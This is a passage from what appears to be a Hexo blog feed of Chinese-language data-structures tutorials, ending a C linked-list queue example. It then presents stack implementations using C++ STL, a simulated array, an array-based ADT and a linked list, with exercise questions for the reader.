class="hljs-comment">// 队列中只有一个元素 </span><br>Q-&gt;front = Q-&gt;rear = <span class="hljs-literal">NULL</span>; <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>Q-&gt;front = Q-&gt;front-&gt;Next;<br>&#125;<br>FrontElem = FrontCell-&gt;Data;<br><span class="hljs-built_in">free</span>(FrontCell);<br><span class="hljs-keyword">return</span> FrontElem;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>Queue Q;<br>Q = <span class="hljs-built_in">CreateQueue</span>();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;入队5\n&quot;</span>); <br><span class="hljs-built_in">AddQ</span>(Q,<span class="hljs-number">5</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;入队4\n&quot;</span>); <br><span class="hljs-built_in">AddQ</span>(Q,<span class="hljs-number">4</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;入队3\n&quot;</span>); <br><span class="hljs-built_in">AddQ</span>(Q,<span class="hljs-number">3</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队%d\n&quot;</span>,<span class="hljs-built_in">DeleteQ</span>(Q));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队%d\n&quot;</span>,<span class="hljs-built_in">DeleteQ</span>(Q));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队%d\n&quot;</span>,<span class="hljs-built_in">DeleteQ</span>(Q));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,<span class="hljs-built_in">DeleteQ</span>(Q));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>队列</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Datastructures-栈</title>
    <link href="/dong.github/2024/09/08/Datastructures-%E6%A0%88/"/>
    <url>/dong.github/2024/09/08/Datastructures-%E6%A0%88/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>后进先出的数据结构，很常用</strong></p><span id="more"></span><h1 id="STL中的stack"><a href="#STL中的stack" class="headerlink" title="STL中的stack"></a>STL中的stack</h1><p><strong>C++的STL提供了stack，将写好的各种功能封装，通过stack容器，可以很方便地使用栈。</strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>STL 栈的应用      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(stack&lt;<span class="hljs-type">int</span>&gt; k)</span></span><br><span class="hljs-function"></span>&#123;<br>stack&lt;<span class="hljs-type">int</span>&gt;kk = k; <span class="hljs-comment">//复制一份出来用于遍历。</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈中元素有：&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt;= kk.<span class="hljs-built_in">size</span>();++ i)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,kk.<span class="hljs-built_in">top</span>());<br>kk.<span class="hljs-built_in">pop</span>();<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>stack&lt;<span class="hljs-type">int</span>&gt; k;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5入栈\n&quot;</span>);<br>k.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);<br><span class="hljs-built_in">print</span>(k);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;7入栈\n&quot;</span>);<br>k.<span class="hljs-built_in">push</span>(<span class="hljs-number">7</span>);<br><span class="hljs-built_in">print</span>(k);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;66入栈\n&quot;</span>);<br>k.<span class="hljs-built_in">push</span>(<span class="hljs-number">66</span>);<br><span class="hljs-built_in">print</span>(k);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,k.<span class="hljs-built_in">top</span>());<br>k.<span class="hljs-built_in">pop</span>();<br><span class="hljs-built_in">print</span>(k);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,k.<span class="hljs-built_in">top</span>());<br>k.<span class="hljs-built_in">pop</span>();<br><span class="hljs-built_in">print</span>(k);<br><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//思考一下，为什么想要遍历还要复制一份出来。</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/dong.github/images/0908-1.png"></div><div class="group-image-wrap"><img src="/dong.github/images/0908.png"></div></div></div><p><strong>这种用法在工程中常见。因为STL写好的栈，作为C++的重要工具，经过了高度优化，综合考虑了易用性、性能、安全性、扩展性、还能够自动管理内存，是比较成熟的技术。”因此，在可能的情况下，建议使用STL std::stack。“</strong></p><h1 id="数组模拟的stack"><a href="#数组模拟的stack" class="headerlink" title="数组模拟的stack"></a>数组模拟的stack</h1>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-dcdac752" role="button" aria-expanded="false" aria-controls="collapse-dcdac752">        <div class="fold-arrow">▶</div>算法编程 栈的应用      </div>      <div class="fold-collapse collapse" id="collapse-dcdac752">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> k[<span class="hljs-number">10</span>];<br><span class="hljs-type">int</span> pointer = <span class="hljs-number">-1</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈中元素有：&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt;= pointer;++ i)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,k[i]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5入栈\n&quot;</span>);<br>k[++pointer] = <span class="hljs-number">5</span>;<br><span class="hljs-built_in">print</span>();<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;7入栈\n&quot;</span>);<br>k[++pointer] = <span class="hljs-number">7</span>;<br><span class="hljs-built_in">print</span>();<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;66入栈\n&quot;</span>);<br>k[++pointer] = <span class="hljs-number">66</span>;<br><span class="hljs-built_in">print</span>();<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,k[pointer]);<br>pointer--;<br><span class="hljs-built_in">print</span>();<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,k[pointer]);<br>pointer--;<br><span class="hljs-built_in">print</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div><p><strong>这种写法在算法编程中常见，因为算法编程常常是小段程序，一般无需考虑安全性，扩展性，而是追求极致的速度。另一方面，算法编程中也不会在栈中存储太多数据，只是想用到栈这种先入后出的特性。所以，用数组模拟栈是个好办法，灵活，轻便。</strong></p><h1 id="栈的顺序表实现"><a href="#栈的顺序表实现" class="headerlink" title="栈的顺序表实现"></a>栈的顺序表实现</h1><h2 id="数组实现"><a href="#数组实现" class="headerlink" title="数组实现"></a>数组实现</h2>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-d727f8b0" role="button" aria-expanded="false" aria-controls="collapse-d727f8b0">        <div class="fold-arrow">▶</div>栈的实现 数组      </div>      <div class="fold-collapse collapse" id="collapse-d727f8b0">        <div class="fold-content">          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXN 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> maxsize 5</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Elementtype;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span> *<span class="hljs-title">Stack</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span>&#123;</span><br>Elementtype Data[MAXN];<br><span class="hljs-type">int</span> Top;<br>&#125;;<br><br>Stack <span class="hljs-title function_">CreateStack</span><span class="hljs-params">()</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">Isempty</span><span class="hljs-params">(Stack S)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">IsFull</span><span class="hljs-params">(Stack S)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(Stack S,Elementtype item)</span>;<br>Elementtype <span class="hljs-title function_">Pop</span><span class="hljs-params">(Stack S)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Print</span><span class="hljs-params">(Stack S)</span>;<br><br>Stack <span class="hljs-title function_">CreateStack</span><span class="hljs-params">()</span><br>&#123;<br>Stack S;<br>S = (Stack)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>S-&gt;Top = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">return</span> S;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(Stack S,Elementtype item)</span><br>&#123;<br><span class="hljs-keyword">if</span>(IsFull(S))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈满\n&quot;</span>);<br><span class="hljs-keyword">return</span> ;<br>&#125;<br>S-&gt;Top ++ ;<br>S-&gt;Data[S-&gt;Top] = item;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">IsFull</span><span class="hljs-params">(Stack S)</span><br>&#123;<br><span class="hljs-keyword">return</span> (S-&gt;Top == maxsize<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">Isempty</span><span class="hljs-params">(Stack S)</span><br>&#123;<br><span class="hljs-keyword">return</span> (S-&gt;Top == <span class="hljs-number">-1</span>);<br>&#125;<br>Elementtype <span class="hljs-title function_">Pop</span><span class="hljs-params">(Stack S)</span><br>&#123;<br><span class="hljs-keyword">if</span>(Isempty(S))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈空\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>Elementtype val = S-&gt;Data[S-&gt;Top];<br>S-&gt;Top--;<br><span class="hljs-keyword">return</span> val;<br>&#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Print</span><span class="hljs-params">(Stack S)</span><br>&#123;<br><span class="hljs-type">int</span> i;  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈内元素有: &quot;</span>);<br><span class="hljs-keyword">for</span> (i = S-&gt;Top; i &gt;= <span class="hljs-number">0</span>; i--) &#123;  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, S-&gt;Data[i]);  <br>&#125;  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);  <br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  void Print(Stack S) &#123;  </span><br><span class="hljs-comment">  Stack copy = CopyStack(S);  </span><br><span class="hljs-comment">  if (!copy) &#123;  </span><br><span class="hljs-comment">  printf(&quot;内存分配失败\n&quot;);  </span><br><span class="hljs-comment">  return;  </span><br><span class="hljs-comment">  &#125;  </span><br><span class="hljs-comment">  for (int i = copy-&gt;Top; i &gt;= 0; i--) &#123;  </span><br><span class="hljs-comment">  printf(&quot;%d &quot;, copy-&gt;Data[i]);  </span><br><span class="hljs-comment">  &#125;  </span><br><span class="hljs-comment">  printf(&quot;\n&quot;);  </span><br><span class="hljs-comment">  free(copy); // 释放复制栈的内存  </span><br><span class="hljs-comment">  &#125;  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>Stack S;<br>S = CreateStack();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">5</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;7入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">7</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;66入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">66</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;99入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">99</span>);<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;100入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">100</span>);<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;110入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">110</span>);<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>思考：先入后出怎么被实现的？</strong><br><strong>思考：被注释掉的那个Print()能起到同样的作用吗，哪个更好？</strong></p>        </div>      </div>    </div><h2 id="链表实现"><a href="#链表实现" class="headerlink" title="链表实现"></a>链表实现</h2>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-9538668d" role="button" aria-expanded="false" aria-controls="collapse-9538668d">        <div class="fold-arrow">▶</div>栈的实现 链表      </div>      <div class="fold-collapse collapse" id="collapse-9538668d">        <div class="fold-content">          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SNode</span> *<span class="hljs-title">Stack</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SNode</span>&#123;</span><br>ElementType Data;<br>Stack Next;<br>&#125;;<br><br><br>Stack <span class="hljs-title function_">CreateStack</span><span class="hljs-params">()</span>;  <span class="hljs-comment">// 初始化链栈 </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">IsEmpty</span><span class="hljs-params">(Stack S)</span>;  <span class="hljs-comment">// 判断链栈是否为空 </span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(Stack S,ElementType item)</span>;  <span class="hljs-comment">// 入栈 </span><br>ElementType <span class="hljs-title function_">Pop</span><span class="hljs-params">(Stack S)</span>;  <span class="hljs-comment">// 出栈</span><br> <br><br><span class="hljs-comment">// 初始化 </span><br>Stack <span class="hljs-title function_">CreateStack</span><span class="hljs-params">()</span>&#123;<br>Stack S;<br>S = (Stack)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> SNode));<br>S-&gt;Next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> S;<br>&#125;<br><br><span class="hljs-comment">// 判断是否为空 </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">IsEmpty</span><span class="hljs-params">(Stack S)</span>&#123;<br><span class="hljs-keyword">return</span> (S-&gt;Next == <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">// 入栈</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(Stack S,ElementType item)</span>&#123;<br>Stack tmp;<br>tmp = (Stack)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> SNode));<br>tmp-&gt;Data = item;<br><span class="hljs-comment">// 链栈栈顶元素是链表头结点，新入栈的链表在栈顶元素后面 </span><br>tmp-&gt;Next = S-&gt;Next;   <br>S-&gt;Next = tmp;<br>&#125; <br><br><span class="hljs-comment">// 出栈</span><br>ElementType <span class="hljs-title function_">Pop</span><span class="hljs-params">(Stack S)</span>&#123;<br>Stack First;<br>ElementType TopVal;<br><span class="hljs-keyword">if</span>(IsEmpty(S))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;堆栈空&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>First = S-&gt;Next;   <span class="hljs-comment">// 出栈第一个元素在栈顶元素后面 </span><br>S-&gt;Next = First-&gt;Next;  <span class="hljs-comment">//把第一个元素从链栈删除 </span><br>TopVal = First-&gt;Data;   <span class="hljs-comment">// 取出被删除结点的值 </span><br><span class="hljs-built_in">free</span>(First);  <span class="hljs-comment">// 释放空间 </span><br><span class="hljs-keyword">return</span> TopVal;<br>&#125;<br>&#125; <br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>Stack S;<br>S = CreateStack();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">5</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;7入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">7</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;66入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">66</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p><strong>思考：咦！这个链表的哑结点怎么不是头指针？</strong><br><strong>我们知道，链表是可以调整的，让s-&gt;Next一直指向栈顶元素，即可实现先入后出</strong><br><strong>不会就只能不断抄程序了。万一睡一觉起来就会了呢？</strong></p>        </div>      </div>    </div><h1 id="STL源码解析-stack"><a href="#STL源码解析-stack" class="headerlink" title="STL源码解析-stack"></a>STL源码解析-stack</h1>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-c60f2023" role="button" aria-expanded="false" aria-controls="collapse-c60f2023">        <div class="fold-arrow">▶</div>STD stack源码      </div>      <div class="fold-collapse collapse" id="collapse-c60f2023">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 